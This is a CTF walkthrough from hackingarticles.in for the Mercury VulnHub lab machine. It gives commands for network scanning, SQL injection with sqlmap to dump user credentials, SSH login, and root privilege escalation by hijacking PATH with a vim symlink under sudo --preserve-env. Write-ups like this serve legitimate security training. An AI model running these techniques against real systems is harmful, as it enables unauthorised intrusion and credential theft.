@@ -1,0 +1,120 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Mercury: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/mercury-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-21T07:40:47+00:00">September 21, 2020</time><time class="updated" datetime="2025-07-10T17:48:30+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Here is another Vulnerable machine called Mercury. It is available on vuln hub. Let’s move further towards this CTF challenge. There are two flags on the box: a user and root flag which include a hash.</span></p>
+<p><span style="color: #000000;">Download <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/the-planets-mercury,544/">Here</a></strong></span>.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Easy</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodologies</span></h3>
+<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration </strong></span></p>
+<ul>
+<li><span style="color: #000000;">Dirb</span></li>
+<li><span style="color: #000000;">robots.txt</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SQL Injection using SQLmap</span></li>
+<li><span style="color: #000000;">SSH Login</span></li>
+<li><span style="color: #000000;">Flag_1 user.txt</span></li>
+<li><span style="color: #000000;">Base 64 encode Password</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing Path Variable</span></li>
+<li><span style="color: #000000;">Abusing Sudo right</span></li>
+<li><span style="color: #000000;">Reading Root Flag</span></li>
+</ul>
+<h3><span style="color: #800000;"><u>Walkthrough</u></span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">Let us start with scanning the network to obtain the IP address of the target machine. We will use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CsOwwQKTtyw/X2hUHxyb0WI/AAAAAAAAov4/QkiQAdFW2HUorEQGQK8Vnv0LFnjiD0RhACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;"> So, identify the machine IP: 192.168.0.163, further we run nmap aggressive scan to identify open port, services &amp; Host detail.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.0.163</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oa5sLfJI6Dc/X2hURPuY8cI/AAAAAAAAov8/FxIFwt7NMs0mQskwChseWOwsdNj80MbGwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">As the scanning results show two services are running on the virtual machine:</span></p>
+<ul>
+<li><span style="color: #000000;">http port 8080</span></li>
+<li><span style="color: #000000;">ssh service port 22</span></li>
+</ul>
+<p><span style="color: #000000;">As http service is running, Let’s check the webpage in the browser by browsing following URL.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://198.168.0.163:8080/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TKZGGLXx2pM/X2hUY81eLaI/AAAAAAAAowI/SQ5jnMWeWHwFjjjNQ3tur74ojw1c5J8ZwCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Here, we didn’t find anything to proceed. Further, we will use Dirb to scan the web directories, it scans the hidden as well as available web directories.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://192.168.0.163:8080/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qcJz-CEF2GI/X2hUev9fwCI/AAAAAAAAowM/VCyKRT1LBKEcKTTKK2Z0kvgTtOrJgOjkACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">As a result of Directory scan, we obtained <strong>/robots.txt</strong> directory. Let’s dig into this directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.163:8080/robots.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5409Zkj5Fxo/X2hUlzrbp5I/AAAAAAAAowQ/qb572jxN4XMhC_9MvEgwKhRb_r1bwqIPgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">The robots.txt was blank, using dirb &amp; other tools I try to dig out more files and directories but found nothing.</span></p>
+<p><span style="color: #000000;">At last, I just hit “*” (asterisk) in the URL as shown here and it gave error page that reveals another path i.e. /mercuryfacts.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.163:8080/*</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aYv5ARRZbuM/X2hUtEuLLYI/AAAAAAAAowU/ZFca6yTEnGoP6S_PKIZm2txOkzy5URTaACLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">On opening the <strong>mercury facts</strong> directory, we found a hyperlink consisting a fact, so now click on <strong>load a fact</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4-1ePCx25fM/X2hU0-f0PZI/AAAAAAAAowc/ns4i4_YAfXkK_jj3U44XE6-BNyHWoZUYACLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Upon executing given hyperlink, I found Fact id:1 page, so I concluded their must some database from where it has called Fact id 1, probably this page may vulnerable against SQL injection, let’s check out this 😊.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iFrtuJd0kQ8/X2hU81AIqgI/AAAAAAAAowg/UYJKYzjoceELXAc147sHDKYvX7c8GgKJACLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">We will use some basic commands: –dbs: enumerates the database. –batch</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u http://192.168.0.163:8080/mercuryfacts/ --dbs --batch</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-KiKkAMpRhGU/X2hVCqoJTJI/AAAAAAAAowo/3hGcVGyEkX4BRuaXNDDs8e5MD0i8DinsgCLcBGAsYHQ/s16000/9.png"/></strong></span></p>
+<p><span style="color: #000000;">After successfully extracting the data, it gave us two databases. Among the two the database “<strong>mercury</strong>” seems to have some information.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fDfCzdewiqk/X2hVIX5CWyI/AAAAAAAAoww/KP-gwQ5b1PIjfdA--9x9yHL1N0Fub-WcQCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Since it was confirmed that the page was vulnerable against SQLi, so we decided to extract all the contents available in the mercury database use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap-u http://192.168.0.163:8080/mercuryfacts -D mercury --dumpall --batch</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jb-_C54IetI/X2hVOcXjLvI/AAAAAAAAow4/nNXouEeYdTw11ptCPrVMx52uZEvbgDbxgCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Here we got four entries in the table named user. The –dumpall in the command list</span></p>
+<p><span style="color: #000000;">all databases, all tables content along with user names and password. And the fourth entry seems interesting.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--ofUMY_AdyE/X2hVT4QuOgI/AAAAAAAAoxA/pl31PSRUFlMKTYOOnn9_zeOiYDVIZYcNgCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">Moving Further if you remember the port scan results gave us two open ports: </span><span style="color: #000000;">another one was ssh. </span><span style="color: #000000;">We will use ssh service to login into the user “webmaster” using the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh webmaster@192.168.0.163</pre>
+<p><span style="color: #000000;">Further, add the password from the above entries and boom! You are logged in as </span><span style="color: #000000;">the user webmaster. </span><span style="color: #000000;">As it’s depicted now, we have accessed the user webmaster. First, we will use<strong> id </strong></span><span style="color: #000000;">the command to check the user and group names and numeric ID’s (UID or group ID) of the current user or any other user in the server.</span></p>
+<p><span style="color: #000000;">Next use<strong> ls</strong> command to list out the directory contents. As a result, we found </span><span style="color: #000000;"><strong>user_flag.txt</strong>, open this using cat command {here is the first user flag.}</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user_flag.txt</pre>
+<p><span style="color: #000000;">Following this we will open the directory <strong>mercury_proj/</strong> by using the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd mercury_proj/
+ls</pre>
+<p><span style="color: #000000;">Here a file named notes.txt is found. On opening it similarly as earlier using cat</span></p>
+<p><span style="color: #000000;">command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat notes.txt</pre>
+<p><span style="color: #000000;">We have found in base64 hash for linuxmaster.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DMi_BZ0pgZk/X2hVcbWQaDI/AAAAAAAAoxE/xJUvle4KbOUxFS7QFkoHyVIIe-JWr-5UgCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">To convert the base64 hash into the plain text we will be using echo command as depicted. This is the password to the user <strong>linuxmaster</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pnDOb3IP5jI/X2hVjG0IFoI/AAAAAAAAoxM/YL2Ua35KQN0U5PMuJ75IQf5ICySGbz2hgCLcBGAsYHQ/s16000/14.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">So, we logged in as linuxmaster with the help of password enumerate above and check sudo rights for the user. Here we saw linuxmaster can execute a bash script i.e. /usr/in/check_syslog.sh as root but in preserve environment and this is due to SETENV tag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su linuxmaster
+sudo -l</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iWafuFxr57c/X2hVrCaHeGI/AAAAAAAAoxU/hsjhB5AcakMu6LjhuzxaxKZEGYC1Q89tQCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Using head command we read the script, the script was written to execute the tail program for reading last 10 syslog entries.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">head -n 5 /usr/bin/check_syslog.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-97mPMl6LTgs/X2hVwh5ZUGI/AAAAAAAAoxc/5iGfmNlaldk6v1zetptLnZbwTYnLogUswCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">As we know the check_syslog.sh could be run in the preserve Environment that means we can abuse the environment path variable (to know more this read from <a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">here</a>). So we tried to make symlinking for vim editor through the tail, then changed environment variable. This could be done using the following commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ln -s /usr/bin/vim tail
+export PATH=$(pwd):$PATH</pre>
+<p><span style="color: #000000;">Once, you will execute above command, further you need to execute the following command that will execute check_syslog.sh in a –preserve environment which will link vim editor to tail program and open the syslog.sh script in vi editor mode.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo --preserve-env=PATH /usr/bin/check_syslog.sh</pre>
+<p><span style="color: #000000;">Since the script is running as root, take the privilege of this, modify the content by editing following:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">:!/bin/bash</pre>
+<p class="lang:default decode:true">Press Enter</p>
+<p><span style="color: #000000;">Booooom!!!!! As soon as you will execute the above command inside the Vim editor and exit the script you will get the root shell.</span></p>
+<p><span style="color: #000000;">Lastly, open the root directory using</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root</pre>
+<p><span style="color: #000000;">There we found a file named <strong>root_flag.txt.</strong> To open the file,</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root_flag.txt</pre>
+<p><span style="color: #000000;">{This is your second flag} </span><span style="color: #000000;">You have complete mercury!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ydLkhbOsEDI/X2hV4rM95_I/AAAAAAAAoxg/uFWddavPEWQlyeOcF0IthC0rIruWwxOfgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Vishva Vaghela is a Digital Forensics enthusiast and enjoys technical content writing. You can reach her on<strong><a style="color: #000000;" href="https://www.linkedin.com/in/vishva-vaghela-979446191/"> Here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
